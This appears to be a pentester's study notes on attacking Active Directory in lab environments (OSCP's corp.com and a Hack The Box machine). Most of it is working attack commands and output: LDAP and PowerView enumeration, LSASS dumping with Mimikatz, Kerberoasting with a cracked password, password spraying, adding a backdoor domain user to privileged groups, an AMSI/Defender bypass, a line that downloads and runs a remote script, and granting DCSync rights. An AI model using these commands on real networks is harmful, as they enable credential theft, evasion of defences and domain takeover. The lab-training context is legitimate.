# Active Directory

## whoEnumeration

### Traditional approach

```
net user /domain ###enumerate all users in the entire domain
net user jeff_admin /domain
net group /domain
```

### **Modern approach**

```
// SoPS C:\Users\offsec.CORP> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent
Domain()
Forest : corp.com
DomainControllers : {DC01.corp.com}
Children : {}
DomainMode : Unknown
DomainModeLevel : 7
Parent :
PdcRoleOwner : DC01.corp.com
RidRoleOwner : DC01.corp.com
InfrastructureRoleOwner : DC01.corp.com
Name : corp.com
```

0x30000000 (decimal 805306368) to the filter property to enumerate all users in the domain

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
$prop
}
Write-Host "------------------------"
}
```

#### Resoving Nested Groups

```
domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=Secret_Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

### **Currently logged on users**

```
PS C:\Tools\active_directory> Import-Module .\PowerView.ps1

enumerate logged-in users with Get-NetLoggedon
PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251

Get-NetSession will return all active sessions, in our case from the domain controller
PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
```

### **Enumerate thorugh Service Principal Names**

While Microsoft has not documented a list of searchable SPN’s there are extensive lists available online.

```
update previously script with this filter
$Searcher.filter="serviceprincipalname=*http*"
```

```
```

## **Authentication**

1. **NTLM**
2. **Kerberos**
3. **Cached Credential Storage and Retrieval**
   1. execute Mimikatz directly from memory using an injector like PowerShell (https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke- ReflectivePEInjection.ps1)or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and from there, load the data into Mimikatz.
4.  Service Account Attacks

    1. Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'H TTP/CorpWebServer.corp.com'
    2. PS C:\Users\offsec.CORP> klist
    3. mimikatz # kerberos::list /export


5. Low and Slow Password Guessing
   1. PS C:\Users\Offsec.corp> net accountss
   2. Spray-Passwords.ps ([ https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1](https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1))



### Kerberoasting

```
kali@kali:~$ sudo apt update && sudo apt install kerberoast
...
kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offse
c@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
found password for ticket 0: Qwerty09! File: 1-40a50000-Offsec@HTTP~CorpWebServer.cor
p.com-CORP.COM.kirbi
All tickets cracked!
```

{% hint style="info" %}
The Invoke-Kerberoast.ps**1** [ **https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-**\
**Kerberoast.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1)**)** script extends this attack, and can automatically enumerate all service principal names in the domain, request service tickets for them, and export them in a format ready for cracking in both John the Ripper and Hashcat, completely eliminating the need for Mimikatz in this attack.
{% endhint %}

### Making use of "GenericAll"

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net user john abc123! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group "Exchange Windows Permissions" john /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net localgroup "Remote Management Users" john /add
The command completed successfully.

```

### Download PowerView

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Bypass-4MSI
[+] Success!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).downloadstring("http://10.10.16.12:8080/PowerView.ps1")

```

The Bypass-4MSI command is used to evade defender before importing the script. Next, we can use the Add-ObjectACL with john's credentials, and give him DCSync rights.



```
$SecPassword = ConvertTo-SecureString 'abc123!!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\john', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
```

##

```
```

